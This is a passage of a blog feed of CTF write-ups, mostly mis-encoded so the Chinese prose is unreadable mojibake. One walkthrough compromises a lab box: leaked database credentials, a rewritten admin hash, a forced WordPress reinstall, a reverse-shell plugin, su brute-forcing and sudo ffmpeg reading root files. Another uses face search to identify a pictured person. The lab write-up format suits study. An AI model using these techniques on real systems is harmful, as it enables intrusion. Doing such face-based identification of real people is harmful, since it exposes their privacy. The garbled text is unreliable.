Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†á‰∏ªÊú∫ÁöÑ IP Âú∞ÂùÄ‰∏∫ `192.168.205.202`„ÄÇ

## 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

Á°ÆÂÆöÁõÆÊ†á IP ÂêéÔºå‰ΩøÁî® `nmap` ÂØπÂÖ∂ËøõË°åËØ¶ÁªÜÁöÑÁ´ØÂè£Êâ´ÊèèÔºåÊé¢ÊµãÂÖ∂ÂºÄÊîæÁöÑÁ´ØÂè£ÂíåÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.202
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 10:13 EDT
Nmap scan report for 192.168.205.202
Host is up (0.00010s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 08:00:27:7D:C4:83 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds```

Êâ´ÊèèÂèëÁé∞ÁõÆÊ†áÂºÄÊîæ‰∫Ü‰∏â‰∏™ÊúçÂä°Á´ØÂè£ÔºöSSH (22), HTTP (80) Âíå MySQL (3306)„ÄÇ
```

# ‰∫å„ÄÅÂàùÂßãËÆøÈóÆ

## 1. Web Â∫îÁî®Êûö‰∏æ

ËÆøÈóÆ 80 Á´ØÂè£ÁöÑ Web ÊúçÂä°ÔºåÈ°µÈù¢ÊèêÁ§∫Êàë‰ª¨ËÆøÈóÆÂüüÂêç `change.dsz`„ÄÇÊàë‰ª¨Â∞ÜËØ•ÂüüÂêç‰∏éÁõÆÊ†á IP ÁöÑÊò†Â∞ÑÂÖ≥Á≥ªÊ∑ªÂä†Âà∞Êú¨Âú∞ `/etc/hosts` Êñá‰ª∂‰∏≠„ÄÇ

‰ΩøÁî® `wfuzz` ÂØπÂ≠êÂüüÂêçËøõË°åÊ®°Á≥äÊµãËØïÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑÂ≠êÂüüÂêç `wordpress.change.dsz`„ÄÇ


Êé•ÁùÄ‰ΩøÁî® `gobuster` ÂØπ `http://change.dsz` ËøõË°åÁõÆÂΩïÊâ´ÊèèÔºåÂèëÁé∞ `login.php`, `admin.php`, `db.php` Á≠âÊñá‰ª∂„ÄÇ

## 2. ‰ø°ÊÅØÊ≥ÑÈú≤‰∏éÊï∞ÊçÆÂ∫ìËÆøÈóÆ

Âú® `login.php` È°µÈù¢ÁöÑ HTML Ê∫êÁ†Å‰∏≠ÔºåÂèëÁé∞‰∫Ü‰∏ÄÊÆµÊ≥®ÈáäÔºåÊ≥ÑÈú≤‰∫ÜÊï∞ÊçÆÂ∫ìÁöÑËøûÊé•Âá≠ÊçÆ„ÄÇ

```html
&lt;!-- Database connection settings:
Host=localhost, DB=changeweb
User=change, Password=change --&gt;
```

Êàë‰ª¨‰ΩøÁî®ËøôÁªÑÂá≠ÊçÆ (`change:change`) ÊàêÂäüËøûÊé•Âà∞ÁõÆÊ†áÁöÑ MySQL ÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ mysql -h 192.168.205.202 -u change -pchange --skip-ssl
Welcome to the MariaDB monitor. ...
...
MariaDB [changeweb]&gt; select * from users;
+----+----------+--------------------------------------------------------------+
| id | username | password                                                     |
+----+----------+--------------------------------------------------------------+
|  1 | root     | $2y$10$EFCK8LdjkDv1W52q0bV8.OLUicO8h6kYBqU5nE1jOcSq3qQ9l5mZG |
+----+----------+--------------------------------------------------------------+
```

Âú® `changeweb` Êï∞ÊçÆÂ∫ìÁöÑ `users` Ë°®‰∏≠ÔºåÊàë‰ª¨ÂèëÁé∞‰∫Ü `root` Áî®Êà∑ÁöÑÂØÜÁ†ÅÂìàÂ∏å„ÄÇ

## 3. Ëé∑ÂèñÁ´ãË∂≥ÁÇπ

ÈÄöËøá `SHOW GRANTS` ÂëΩ‰ª§Êü•ËØ¢ÂèØÁü•Ôºå`change` Áî®Êà∑Êã•ÊúâÂØπ `changeweb` Êï∞ÊçÆÂ∫ìÁöÑÂÖ®ÈÉ®ÊùÉÈôêÔºåËøôÊÑèÂë≥ÁùÄÊàë‰ª¨ÂèØ‰ª•‰øÆÊîπË°®‰∏≠ÁöÑÊï∞ÊçÆ„ÄÇÊàë‰ª¨Êú¨Âú∞ÁîüÊàê‰∏Ä‰∏™Êñ∞ÁöÑÂØÜÁ†ÅÂìàÂ∏åÔºàÂØÜÁ†Å‰∏∫ `1`ÔºâÔºåÂπ∂Êõ¥Êñ∞ `users` Ë°®‰∏≠ÁöÑ `root` Áî®Êà∑ÂØÜÁ†Å„ÄÇ

```bash
# Âú®ÊîªÂáªÊú∫‰∏äÁîüÊàêÂØÜÁ†ÅÂìàÂ∏å
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ php -r 'echo password_hash('1', PASSWORD_DEFAULT);'
$2y$12$l22u4aCvdoTp.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG

# Âú®Êï∞ÊçÆÂ∫ì‰∏≠Êõ¥Êñ∞ÂØÜÁ†Å
MariaDB [changeweb]&gt; UPDATE users SET password = '$2y$12$l22u4aCvdoTp.g5g4RTBheEeHiBFzCFUK3pi1cJkGQY39OjKE/HTG' WHERE username = 'root';
```

‰ΩøÁî® `root:1` ÊàêÂäüÁôªÂΩïÂêéÂè∞ `admin.php`ÔºåÂèëÁé∞ËøôÊòØ‰∏Ä‰∏™ÂëΩ‰ª§ÊâßË°åÈ°µÈù¢Ôºå‰ΩÜÂäüËÉΩÂèóÈôêÔºåÂè™ÂÖÅËÆ∏ÊâßË°å `ls`, `rm`, `pwd` Á≠âÂ∞ëÊï∞ÂëΩ‰ª§„ÄÇ

Êàë‰ª¨ÁöÑÁõÆÊ†áÊòØ `wordpress.change.dsz`„ÄÇÂà©Áî®Â∑≤Áü•ÊºèÊ¥ûÔºåÂ¶ÇÊûú WordPress ÁöÑ `wp-config.php` Êñá‰ª∂Ë¢´Âà†Èô§ÔºåÂÜçÊ¨°ËÆøÈóÆÁΩëÁ´ô‰ºöËß¶ÂèëÈáçÊñ∞ÂÆâË£ÖÊµÅÁ®ã„ÄÇÂà©Áî® `admin.php` ÁöÑ `rm` ÂëΩ‰ª§ÊâßË°åÊùÉÈôêÔºåÊàë‰ª¨Âà†Èô§‰∫ÜËØ•ÈÖçÁΩÆÊñá‰ª∂„ÄÇ

```bash
# Âú® admin.php È°µÈù¢ÊâßË°å
rm ../wordpress.change.dsz/wp-config.php
```

Âà∑Êñ∞ `http://wordpress.change.dsz/`ÔºåÊûúÁÑ∂ËøõÂÖ•‰∫Ü WordPress ÁöÑÂÆâË£ÖÁïåÈù¢„ÄÇÊàë‰ª¨Âà©Áî®Â∑≤ÊéåÊè°ÁöÑ `changeweb` Êï∞ÊçÆÂ∫ìÂá≠ÊçÆÂÆåÊàê‰∫ÜÂÆâË£ÖÔºåÂπ∂ËÆæÁΩÆ‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑÁÆ°ÁêÜÂëòË¥¶Êà∑„ÄÇ

ÁôªÂΩï WordPress ÂêéÂè∞ÂêéÔºåÊàë‰ª¨‰∏ä‰º†Âπ∂ÊøÄÊ¥ª‰∫Ü‰∏Ä‰∏™ÂåÖÂê´ÂèçÂêë Shell ÁöÑÊÅ∂ÊÑèÊèí‰ª∂ÔºåÊàêÂäüÂú®Êú¨Âú∞ `nc` ÁõëÂê¨Âô®‰∏äÊé•Êî∂Âà∞‰∫Ü‰∏Ä‰∏™ `www-data` Áî®Êà∑ÁöÑ Shell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.202] 47432
...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. ÊèêÊùÉËá≥ `lzh` Áî®Êà∑

Âú® `www-data` ÁöÑ Shell ‰∏≠ÔºåÊàë‰ª¨Âú® `/home/lzh/` ÁõÆÂΩï‰∏ãÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `.pass.txt` ÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏Êñá‰ª∂Âíå‰∏Ä‰∏™ `user.txt`„ÄÇ

Êàë‰ª¨Â∞ÜÂØÜÁ†ÅÁàÜÁ†¥Â∑•ÂÖ∑ `suForce` ‰∏ä‰º†Âà∞ÁõÆÊ†áÊúçÂä°Âô®ÁöÑ `/tmp` ÁõÆÂΩïÔºåÂπ∂‰ΩøÁî® `.pass.txt` ‰Ωú‰∏∫Â≠óÂÖ∏ÔºåÂØπÊú¨Âú∞Áî®Êà∑ `lzh` ËøõË°åÂØÜÁ†ÅÁàÜÁ†¥„ÄÇ

```bash
www-data@Change:/tmp$ ./suForce -u lzh -w /home/lzh/.pass.txt
...
üí• Password | 1a2b3c4d1a2b3c4d
...
```

ÊàêÂäüÁ†¥Ëß£Âá∫ `lzh` Áî®Êà∑ÁöÑÂØÜÁ†Å‰∏∫ `1a2b3c4d1a2b3c4d`„ÄÇÊàë‰ª¨‰ΩøÁî®ËØ•Âá≠ÊçÆÈÄöËøá SSH ÁôªÂΩïÔºåËé∑Âæó‰∫Ü `lzh` Áî®Êà∑ÁöÑ ShellÔºåÂπ∂ËØªÂèñ‰∫ÜÁ¨¨‰∏Ä‰∏™ flag„ÄÇ

```bash
lzh@Change:~$ cat user.txt
flag{user-a05597ed1f36976e88c2e10a74902c52}
```

## 2. ÊèêÊùÉËá≥ `root`

Êàê‰∏∫ `lzh` Áî®Êà∑ÂêéÔºåÊàë‰ª¨Ê£ÄÊü•ÂÖ∂ `sudo` ÊùÉÈôê„ÄÇ

```bash
lzh@Change:~$ sudo -l
...
User lzh may run the following commands on Change:
    (ALL) NOPASSWD: /usr/bin/ffmpeg
```

ÁªìÊûúÊòæÁ§∫Ôºå`lzh` Áî®Êà∑ÂèØ‰ª•Êó†ÈúÄÂØÜÁ†Å‰ª• `root` ÊùÉÈôêÊâßË°å `/usr/bin/ffmpeg` ÂëΩ‰ª§„ÄÇ`ffmpeg` ÊòØ‰∏Ä‰∏™ÂäüËÉΩÂº∫Â§ßÁöÑÂ§öÂ™í‰ΩìÂ§ÑÁêÜÂ∑•ÂÖ∑ÔºåÂÖ∂ `drawtext` Êª§ÈïúÂèØ‰ª•ËØªÂèñÊåáÂÆöÊñá‰ª∂ÁöÑÂÜÖÂÆπÂπ∂Â∞ÜÂÖ∂Ê∏≤ÊüìÂà∞ËßÜÈ¢ëÊàñÂõæÁâá‰∏ä„ÄÇÊàë‰ª¨ÂèØ‰ª•Âà©Áî®Ê≠§ÁâπÊÄßËØªÂèñ‰ªªÊÑèÊñá‰ª∂„ÄÇ

Êàë‰ª¨ÊûÑÈÄ† `ffmpeg` ÂëΩ‰ª§ÔºåÂ∞Ü `/root/root.txt` ÁöÑÂÜÖÂÆπ‰Ωú‰∏∫ÊñáÊú¨ÔºåÁªòÂà∂Âà∞‰∏Ä‰∏™Êñ∞ÁöÑÂõæÁâáÊñá‰ª∂ `/tmp/flag.png` ‰∏≠„ÄÇ

```bash
lzh@Change:/tmp$ sudo /usr/bin/ffmpeg -f lavfi -i 'nullsrc' -vf 'drawtext=fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf:textfile=/root/root.txt:fontsize=24:fontcolor=white' -frames:v 1 /tmp/flag.png
```

ÂëΩ‰ª§ÊàêÂäüÊâßË°åÂêéÔºåÂú® `/tmp` ÁõÆÂΩï‰∏ãÁîüÊàê‰∫Ü `flag.png`„ÄÇÊàë‰ª¨Âú®ËØ•ÁõÆÂΩï‰∏ãÂºÄÂêØ‰∏Ä‰∏™‰∏¥Êó∂ÁöÑ Python HTTP ÊúçÂä°Âô®„ÄÇ

```bash
lzh@Change:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

ÊúÄÂêéÔºåÂú®Êàë‰ª¨ÁöÑÊîªÂáªÊú∫‰∏äÈÄöËøáÊµèËßàÂô®ËÆøÈóÆ `http://192.168.205.202:8000/flag.png`ÔºåÂõæÁâá‰∏äÊ∏ÖÊô∞Âú∞ÊòæÁ§∫‰∫Ü `root` flag ÁöÑÂÜÖÂÆπ„ÄÇ

![image](https://7r1UMPHK.github.io/image/20250721225001229.webp)

# Âõõ„ÄÅËé∑ÂèñÊâÄÊúâ Flag

Ëá≥Ê≠§ÔºåÊàë‰ª¨ÊàêÂäüËé∑Âèñ‰∫ÜÁ≥ªÁªü‰∏äÁöÑÊâÄÊúâ flag„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Change.html</guid><pubDate>Mon, 21 Jul 2025 15:04:41 +0000</pubDate></item><item><title>Challenge 065</title><link>https://7r1UMPHK.github.io/post/Challenge%20065.html</link><description># 065

## material ÊùêÊñô

### badge.png ÂæΩÁ´†

![image-20250720175756421](https://7r1umphk.github.io/image/20250721120816690.webp)

XÁâπÂ∑•

ÁΩëÁªúÈÉ®Èó®

ÊöÇÊó∂googleÊ≤°ÊúâÊâæÂà∞Âá∫Â§Ñ

yandexÊâæÂà∞Áõ∏‰ººÁöÑyoutubeÁî®Êà∑
https://www.youtube.com/@botaniker6644/videos ‰∏ªÈ¢òcsgo Êó†Áî®

### files.zip Êñá‰ª∂

Ëß£ÂéãÂá∫filesÊñá‰ª∂Â§π

### letter.txt ‰ø°

```
Good morning AgentX,

Before continuing with the new mission, you need to read the welcome message from our best agent WhiteRabbit.

&gt; Distinguished AgentX,
&gt; 
&gt; 
&gt; It is with great pleasure that I extend to you a warm welcome to our esteemed hacking group. Your inclusion enhances our collective capabilities, and we anticipate your contributions with enthusiasm. As we navigate the intricacies of cyberspace, I am confident that your skills will prove invaluable to our endeavors.
&gt; 
&gt; May our collaboration be marked by professionalism, mutual respect, and shared success. We look forward to your insights and expertise as we embark on various undertakings together.
&gt; 
&gt; Once again, welcome to the team.
&gt; 
&gt; Sincerely,
&gt; WhiteRabbit
&gt; 

# MISSION

Now let‚Äôs talk, about your mission:
You will need to search all possible information about the target and store them for the future. You will later receive from another team member a encrypted message that was left by him before vanishing. We absolutely need your capabilities to be able to understand what he is trying to do.
You will need a special key obtained in (https://hackmyvm.eu/challenges/challenge.php?c=052) to be able to see the to start with the mission.

Best of luck for you AgentX,

Sh4dowExe
```

ÊâíÊãâÂà∞‰∫Ü‰ΩúËÄÖX

https://x.com/Sh4dow3x3

#### ÁøªËØë

```
AgentXÔºåÊó©‰∏äÂ•ΩÔºÅ

Âú®ÁªßÁª≠ÊâßË°åÊñ∞‰ªªÂä°‰πãÂâçÔºåËØ∑ÈòÖËØªÊàë‰ª¨ÊúÄÊ£íÁöÑÁâπÂ∑•‚ÄúÁôΩÂÖî‚ÄùÔºàWhiteRabbitÔºâÁöÑÊ¨¢ËøéËØç„ÄÇ

&gt; Â∞äÊï¨ÁöÑ AgentXÔºå
&gt;
&gt;
&gt; ÊàëÈùûÂ∏∏È´òÂÖ¥Âú∞ÂêëÊÇ®Ëá¥‰ª•ÁÉ≠ÁÉàÁöÑÊ¨¢ËøéÔºåÊ¨¢ËøéÊÇ®Âä†ÂÖ•Êàë‰ª¨Â∞äË¥µÁöÑÈªëÂÆ¢Âõ¢Èòü„ÄÇÊÇ®ÁöÑÂä†ÂÖ•Â¢ûÂº∫‰∫ÜÊàë‰ª¨ÁöÑÈõÜ‰ΩìÂÆûÂäõÔºåÊàë‰ª¨ÁÉ≠ÂàáÊúüÂæÖÊÇ®ÁöÑË¥°ÁåÆ„ÄÇÂú®Êàë‰ª¨Êé¢Á¥¢ÈîôÁªºÂ§çÊùÇÁöÑÁΩëÁªúÁ©∫Èó¥‰πãÈôÖÔºåÊàëÁõ∏‰ø°ÊÇ®ÁöÑÊäÄËÉΩÂ∞ÜÂØπÊàë‰ª¨ÁöÑ‰∫ã‰∏öÂèëÊå•‰∏çÂèØ‰º∞ÈáèÁöÑ‰ΩúÁî®„ÄÇ
&gt;
&gt; ÊÑøÊàë‰ª¨ÁöÑÂêà‰Ωú‰ª•‰∏ì‰∏öÁ≤æÁ•û„ÄÅÁõ∏‰∫íÂ∞äÈáçÂíåÂÖ±ÂêåÊàêÂäü‰∏∫Ê†áÂøó„ÄÇÊàë‰ª¨ÊúüÂæÖÊÇ®Âú®ÂÖ±ÂêåÂºÄÂ±ïÂêÑÈ°πÂ∑•‰ΩúÊó∂Êèê‰æõÂÆùË¥µÁöÑËßÅËß£Âíå‰∏ì‰∏öÁü•ËØÜ„ÄÇ
&gt;
&gt; ÂÜçÊ¨°Ê¨¢ËøéÊÇ®Âä†ÂÖ•Êàë‰ª¨ÁöÑÂõ¢Èòü„ÄÇ
&gt;
&gt; Ê≠§Ëá¥Ôºå
&gt; ÁôΩÂÖî
&gt;

# ‰ªªÂä°

Áé∞Âú®ÔºåËÆ©Êàë‰ª¨Êù•Ë∞àË∞àÊÇ®ÁöÑ‰ªªÂä°Ôºö
ÊÇ®ÈúÄË¶ÅÊêúÁ¥¢ÊâÄÊúâÂÖ≥‰∫éÁõÆÊ†áÁöÑÂèØËÉΩ‰ø°ÊÅØÔºåÂπ∂Â∞ÜÂÖ∂‰øùÂ≠ò‰ª•Â§áÂ∞ÜÊù•‰ΩøÁî®„ÄÇ‰Ω†Á®çÂêé‰ºöÊî∂Âà∞Âè¶‰∏Ä‰ΩçÂõ¢ÈòüÊàêÂëòÂú®Ê∂àÂ§±ÂâçÁïô‰∏ãÁöÑÂä†ÂØÜ‰ø°ÊÅØ„ÄÇÊàë‰ª¨ÁªùÂØπÈúÄË¶Å‰Ω†ÁöÑËÉΩÂäõÊù•ÁêÜËß£‰ªñÊÉ≥Ë¶ÅÂÅö‰ªÄ‰πà„ÄÇ
‰Ω†ÈúÄË¶Å‰∏Ä‰∏™Âú® (https://hackmyvm.eu/challenges/challenge.php?c=052) Ëé∑ÂèñÁöÑÁâπÊÆäÂØÜÈí•ÊâçËÉΩÊü•Áúã‰ªªÂä°ÁöÑÂºÄÂßãÈÉ®ÂàÜ„ÄÇ

Á•ù AgentX Â•ΩËøêÔºÅ

Sh4dowExe
```

## files

### file.txt

```
     _                      _______                      _					
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_		
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb		
 V      ~'Mb          dOOOOOOOOOOOOOOOOOb          dM'~      V		
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~'YOOOOOOOOOOOP'~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'						
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'   

496665656C796F757267617A65696E7468657065726970686572792C61737562746C6565
63686F6F66666F6F747374657073696E73796E63776974686D696E652E54686564616E63
65696E736861646F77736861736E6F74676F6E65756E6E6F74696365642E496E74686973
696E747269636174657765626F6670617468732C4973656E7365796F757273696C656E74
707572737569742E4F75726A6F75726E657974616B657375737468726F75676874776973
7473616E647475726E732C796574796F757270726573656E6365697361636F6E7374616E
742C6C696B656167686F7374696E74686572656172766965776D6972726F722E4E6F6E65
6564666F72636F6465646D657373616765736F72636C616E64657374696E657369676E61
6C7374686561776172656E65737368616E6773696E7468656169722C6173686172656473
65637265746265747765656E7072656461746F72616E64707265792E4C6574697462656B
6E6F776E7468617474686568756E7465646973636F676E697A616E742C77656176696E67
7468726F7567687468656C61627972696E746877697468707572706F73652E5468656368
6173652C74686F75676873696C656E742C69736174657374616D656E74746F746865696E
7472696361636965736F666F75726661746573696E7465727477696E696E672E41737468
656E6172726174697665756E666F6C64732C72656D656D626572746869733A6576657279
737465706563686F6573696E746865636F727269646F72736F66616E7469636970617469
6F6E2E556E74696C6F75727061746873636F6E76657267656F72646976657267652C6C65
7474686564616E6365636F6E74696E75652E
     _                      _______                      _					
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_		
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb		
 V      ~'Mb          dOOOOOOOOOOOOOOOOOb          dM'~      V		
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~'YOOOOOOOOOOOP'~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'						
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~' 
```

#### hexËß£Á†Å

```
Ifeelyourgazeintheperiphery,asubtleechooffootstepsinsyncwithmine.Thedanceinshadowshasnotgoneunnoticed.Inthisintricatewebofpaths,Isenseyoursilentpursuit.Ourjourneytakesusthroughtwistsandturns,yetyourpresenceisaconstant,likeaghostintherearviewmirror.Noneedforcodedmessagesorclandestinesignalstheawarenesshangsintheair,asharedsecretbetweenpredatorandprey.Letitbeknownthatthehuntediscognizant,weavingthroughthelabyrinthwithpurpose.Thechase,thoughsilent,isatestamenttotheintricaciesofourfatesintertwining.Asthenarrativeunfolds,rememberthis:everystepechoesinthecorridorsofanticipation.Untilourpathsconvergeordiverge,letthedancecontinue.
```

##### ÊÅ¢Â§ç

```
I feel your gaze in the periphery, a subtle echo of footsteps in sync with mine.
The dance in shadows has not gone unnoticed.
In this intricate web of paths, I sense your silent pursuit.
Our journey takes us through twists and turns, yet your presence is a constant, like a ghost in the rear-view mirror.
No need for coded messages or clandestine signals‚Äîthe awareness hangs in the air, a shared secret between predator and prey.
Let it be known that the hunted is cognizant, weaving through the labyrinth with purpose.
The chase, though silent, is a testament to the intricacies of our fates intertwining.
As the narrative unfolds, remember this: every step echoes in the corridors of anticipation.
Until our paths converge or diverge, let the dance continue.
```

Ê≤°ÊâæÂà∞Âá∫Â§Ñ

##### ÁøªËØë

```
ÊàëÊÑüÂèóÂà∞‰Ω†‰ΩôÂÖâÈáåÁöÑÂáùËßÜÔºåÈÇ£ÊòØ‰∏éÊàëÂêåÊ≠•ÁöÑËÑöÊ≠•Âú®ÊöóÂ§ÑËΩªÊüîÂõûÂìç„ÄÇ
Èò¥ÂΩ±‰∏≠ÁöÑËàûÊ≠•Âπ∂Êú™ÈÄÉËøáÊàëÁöÑÁúºÁùõ„ÄÇ
Âú®ËøôÁ∫µÊ®™‰∫§ÈîôÁöÑË∑ØÁΩëÈáåÔºåÊàëÂØüËßâÂà∞‰Ω†Êó†Â£∞ÁöÑËøΩÈÄê„ÄÇ
Êàë‰ª¨‰∏ÄË∑ØËúøËúíÂâçË°åÔºåËÄå‰Ω†ÁöÑÂ≠òÂú®Âç¥ÂßãÁªàÂ¶ÇÂΩ±ÈöèÂΩ¢ÔºåÂÉèÂêéËßÜÈïúÈáåÊå•‰πã‰∏çÂéªÁöÑÂπΩÂΩ±„ÄÇ
Êó†ÈúÄÊöóÂè∑Ôºå‰πüÊó†ÈúÄÂØÜËØ≠‚Äî‚ÄîËøô‰ªΩÂøÉÁü•ËÇöÊòéÁöÑÈªòÂ•ëÊÇ¨ÊµÆÂú®Á©∫Ê∞îÈáåÔºåÊòØÁåéËÄÖ‰∏éÁåéÁâ©Èó¥ÂøÉÁÖß‰∏çÂÆ£ÁöÑÁßòÂØÜ„ÄÇ
ËØ∑Áü•ÊôìÔºöË¢´ÁåéËÄÖÂπ∂ÈùûÊó†Áü•Ôºå‰ªñÊ≠£Â∏¶ÁùÄÁõÆÁöÑÁ©øÊ¢≠‰∫éËø∑ÂÆ´„ÄÇ
ËøôÂú∫Êó†Â£∞ÁöÑËøΩÈÄêÔºåÊ≠£ÊòØÊàë‰ª¨ÂëΩËøê‰∫§ÁªáÁöÑÊòéËØÅ„ÄÇ
ÂΩìÊïÖ‰∫ãÁªßÁª≠Èì∫Â±ïÔºåËØ∑ËÆ∞‰ΩèÔºöÊØè‰∏ÄÊ≠•ÈÉΩÂú®ÊúüÂæÖÁöÑÂõûÂªäÈáåÊøÄËµ∑ÂõûÂ£∞„ÄÇ
Áõ¥Âà∞Êàë‰ª¨‰∫§Ê±áÊàñÂàÜÁ¶ªÔºåËÆ©ËøôÊîØËàûÁªßÁª≠„ÄÇ
```

#### Ëß£ÂéãÁº©HTTP

```
tthedancecontinue.
```

##### ÁøªËØë

ËàûËπàÁªßÁª≠„ÄÇ

### target.png

![image-20250720180143396](https://7r1umphk.github.io/image/20250721120821603.webp)

ÊâíÊãâÂà∞‰∫Ü‰∏Ä‰∏™Â∑®ÂÉèÁöÑ
https://www.idcreator.com/id-card-templates/plastic-business-cards/employee-id-card-2.html

![image-20250720181852097](https://7r1umphk.github.io/image/20250721120825661.webp)

- **Date of Birth**: 1960/1/5
- **Blood Group**: O+
- **Mobile**: +78935859580

ÊâÄ‰ª•Êé®ÊµãÊòØÊâæ‰∫∫ËÑ∏

ÂõæÁâáÊâíÊãâ‰∫Ü‰∏Ä‰∏™ÂæàÂÉèÔºå‰ΩÜÊòØÈÇ£‰∏™Âπ≥Âè∞Ë¶ÅÈí±
https://pimeyes.com/en/results/qY6_250720pde3o1c9nhaqgk8e0dcd836?query=c1809c90dcfdfdef809cbe8afeeededf

![image-20250720230532694](https://7r1umphk.github.io/image/20250721120829295.webp)

```
2023:11:24 17:16:07-05:00
```

‰∏çÂÅö‰∫ÜÔºåÂ∞ÅÊ°£

ÁõÆÂâçÊù•ÁúãÂ∞±ÊòØÈÄöËøá‰∫∫Áâ©ÂõæÁâáËøõË°åÂèçÂêë

‰ª•‰∏ãÊòØaiÊâ©ÂõæÂíåÂõæÁâáÊîæÂ§ßÁöÑÊàêÊûú
![IMG_20250721_0115591](https://7r1umphk.github.io/image/20250721120912315.webp)

![image-20250721120933973](https://7r1umphk.github.io/image/20250721120934213.webp)

![image-20250721120944955](https://7r1umphk.github.io/image/20250721120945338.webp)

ÁõÆÂâçËßâÂæóÊúÄÊúâÂèØËÉΩÁöÑÊòØËÅå‰∏ö‰∏∫ÂåªÁîüÔºåÊä§Â£´ÔºåÊä§ÁêÜÊñπÂêë

ÂèØËÉΩÊòØ‰ΩøÁî®ËÑ∏‰π¶ËøõË°åÂ§ßÈáèÊêúÁ¥¢sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20065.html</guid><pubDate>Mon, 21 Jul 2025 04:12:09 +0000</pubDate></item><item><title>Challenge 064</title><link>https://7r1UMPHK.github.io/post/Challenge%20064.html</link><description>ÂÆ≥ÔºåÊòüÊúüÊó•ËøòË¶ÅÁúãÂ§áËÄÉËßÜÈ¢ëÔºåÊîæÊùæ‰∏Ä‰∏ã

![image-20250720151939191](https://7r1UMPHK.github.io/image/20250720151939414.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 064.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 337165 bytes (330 KiB)

Extracting archive: 064.zip
--
Path = 064.zip
Type = zip
Physical Size = 337165

Everything is Ok

Files: 2
Size:       337065
Compressed: 337165
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al        
ÊÄªËÆ° 675
drwxr-xr-x 1 kali kali   4096  7Êúà20Êó• 03:20 .
drwxr-xr-x 1 kali kali  12288  7Êúà20Êó• 03:14 ..
-rwxr-xr-x 1 kali kali 337165  7Êúà20Êó• 03:19 064.zip
-rwxr-xr-x 1 kali kali 336604 2024Âπ¥ 1Êúà17Êó• challenge.png
-rwxr-xr-x 1 kali kali    461 2024Âπ¥ 1Êúà18Êó• decodesteg.py
                                  
```

![challenge](https://7r1UMPHK.github.io/image/20250720152043954.webp)

